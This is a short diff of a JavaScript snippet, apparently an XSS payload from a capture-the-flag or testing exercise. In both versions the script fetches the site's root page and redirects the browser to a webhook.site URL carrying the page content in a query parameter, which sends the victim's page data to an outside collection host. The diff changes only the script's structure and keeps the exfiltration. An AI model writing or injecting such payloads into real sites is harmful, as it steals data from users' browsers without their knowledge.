@@ -1,8 +1,7 @@
-var url;
+var $url = "";
 
 fetch('/')
   .then(res => res.text())
-  .then(data => url = "https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + encodeURIComponent(data))
-  .then(() => document.location.replace(url))
+  .then(data => document.location.replace("https://webhook.site/f82ca88a-d292-4eb0-9d6a-fc6f9572c8c9?c=" + encodeURIComponent(data)))
 
-document.location.replace(url);
+
